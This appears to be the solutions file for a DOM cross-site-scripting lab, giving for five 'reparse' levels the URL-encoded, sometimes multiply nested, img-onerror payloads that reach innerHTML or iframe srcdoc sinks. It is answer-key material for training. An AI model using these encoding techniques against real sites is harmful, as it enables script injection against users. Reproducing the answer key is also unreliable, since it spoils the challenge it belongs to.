# reparse — solutions

DOM sinks that take a query param, repeatedly reparse it through URLSearchParams / nested wrappers, then dump into innerHTML or iframe srcdoc.

### reparse-level1

`/reparse/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: URLSearchParams round-trip then `innerHTML`

### reparse-level2

`/reparse/level2/?blob=query%3D%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E`

- payload: `<img src=x onerror=alert(1)>`
- context: blob is parsed as nested querystring; template.innerHTML then cloned

### reparse-level3

`/reparse/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: wrapped in `<section>` then iframe srcdoc

### reparse-level4

`/reparse/level4/?blob=html%3D%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E`

- payload: `<img src=x onerror=alert(1)>`
- context: nested blob -> html key -> iframe srcdoc

### reparse-level5

`/reparse/level5/?blob=outer%3Dquery%253D%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert(1)%25253E`

- payload: `<img src=x onerror=alert(1)>`
- context: double-nested querystring decode then innerHTML
